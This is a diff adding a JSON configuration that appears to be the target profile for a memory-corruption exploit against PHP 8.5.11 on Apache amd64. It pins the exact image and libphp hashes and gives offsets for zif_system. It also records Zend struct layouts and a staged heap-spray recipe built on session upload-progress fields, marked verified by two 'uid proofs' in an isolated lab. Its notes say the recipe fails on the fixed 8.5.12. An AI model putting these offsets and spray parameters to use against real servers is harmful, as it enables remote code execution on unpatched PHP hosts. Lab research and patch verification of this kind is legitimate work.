@@ -1,0 +1,150 @@
+{
+  "schema_version": 1,
+  "id": "php-8.5.11-apache-amd64-r0-spray",
+  "verification": {
+    "state": "verified",
+    "runs": 2,
+    "proof": "uid-only-local-isolated-lab-2-of-2",
+    "verified_at": "2026-10-23T00:00:00Z"
+  },
+  "build": {
+    "image": {
+      "repo_digest": "php@sha256:47e6d8849049375e0d19e81f1b391ed88828d4653e0d1b00822185b66b564e8b",
+      "image_id": "sha256:b384c1b31d2008af2160a735bb856317926f893553293f526024019a31d0fd6b",
+      "platform": "linux/amd64"
+    },
+    "php": {
+      "version": "8.5.11",
+      "sapi": "apache2handler",
+      "zts": false,
+      "debug": false
+    },
+    "libphp": {
+      "path": "/usr/lib/apache2/modules/libphp.so",
+      "sha256": "2c80ca2a245ca1ccca9946f30ebeca210b9689bc24f2bd07eda717d70108ee5d",
+      "gnu_build_id": "13ba090198423880ce5847c4e3f92c48f2385a72",
+      "elf_class": 64,
+      "endianness": "little",
+      "machine": "EM_X86_64",
+      "type": "ET_DYN"
+    }
+  },
+  "symbols": {
+    "zif_system": {
+      "name": "zif_system",
+      "offset": "0x5996e0"
+    },
+    "zval_ptr_dtor": {
+      "name": "zval_ptr_dtor",
+      "offset": "0x7b47a0"
+    }
+  },
+  "abi": {
+    "pointer_size": 8,
+    "page_size": "0x1000",
+    "zend_mm_chunk_size": "0x200000",
+    "zend_string": {
+      "size_before_val": "0x18",
+      "len": "0x10",
+      "val": "0x18"
+    },
+    "zval": {
+      "size": "0x10",
+      "value": "0x0",
+      "type_info": "0x8"
+    },
+    "zend_reference": {
+      "size": "0x20",
+      "gc": "0x0",
+      "val": "0x8",
+      "sources": "0x18"
+    },
+    "zend_array": {
+      "size": "0x38",
+      "gc": "0x0",
+      "flags": "0x8",
+      "table_mask": "0xc",
+      "ar_data": "0x10",
+      "num_used": "0x18",
+      "num_elements": "0x1c",
+      "table_size": "0x20",
+      "internal_pointer": "0x24",
+      "next_free": "0x28",
+      "destructor": "0x30"
+    },
+    "zend_execute_data": {
+      "size": "0x50",
+      "opline": "0x0",
+      "call": "0x8",
+      "return_value": "0x10",
+      "func": "0x18",
+      "this": "0x20",
+      "num_args": "0x2c",
+      "prev": "0x30",
+      "symbol_table": "0x38",
+      "call_info": "0x40",
+      "arg1": "0x50"
+    },
+    "types": {
+      "is_string": "0x6",
+      "is_array": "0x7",
+      "is_reference": "0xa",
+      "gc_string": "0x106",
+      "array_ex": "0x307"
+    }
+  },
+  "runtime": {
+    "mpm": "prefork",
+    "workers": 1,
+    "memory_limit": "8M",
+    "post_max_size": "64M",
+    "upload_max_filesize": "64M",
+    "max_input_vars": 1000,
+    "display_errors": true,
+    "file_uploads": true,
+    "session_extension": true,
+    "upload_progress_enabled": true,
+    "session_name": "PHPSESSID",
+    "upload_progress_name": "PHP_SESSION_UPLOAD_PROGRESS"
+  },
+  "request_recipe": {
+    "huge_mb": 12,
+    "rotate_fillers": 1001,
+    "stage1": {
+      "fillers": 841,
+      "allow_cookie_self_calibration": true
+    },
+    "stage2": {
+      "strategy": "adaptive-window-v1",
+      "window": "0x20000",
+      "arrays": 150
+    },
+    "stage3": {
+      "strategy": "r0-spray-v1",
+      "trigger_pads": 32,
+      "r0_search": {
+        "page_lo": "0x73000",
+        "page_hi_exclusive": "0x74000",
+        "page_step": "0x1000",
+        "lowbits": [
+          "0x180"
+        ],
+        "releak_every": 24
+      },
+      "spray": {
+        "value_len": 4071,
+        "count": 128,
+        "ht_page_offset": "0x800"
+      },
+      "pre_session_fields": {
+        "count": 1,
+        "value_len": 19,
+        "name_prefix": "s"
+      }
+    }
+  },
+  "provenance": {
+    "source": "local-isolated-docker-port-lab",
+    "notes": "Exact official PHP 8.5.11 Apache linux/amd64 image and the 8 MiB/single-prefork runtime. The consumer needs one 19-byte field before PHPSESSID and 127 large values (128 total fields); r0 0x73180 produced two independent ptrace-free uid proofs. The same recipe stopped at the leak on fixed PHP 8.5.12 and produced no proof."
+  }
+}
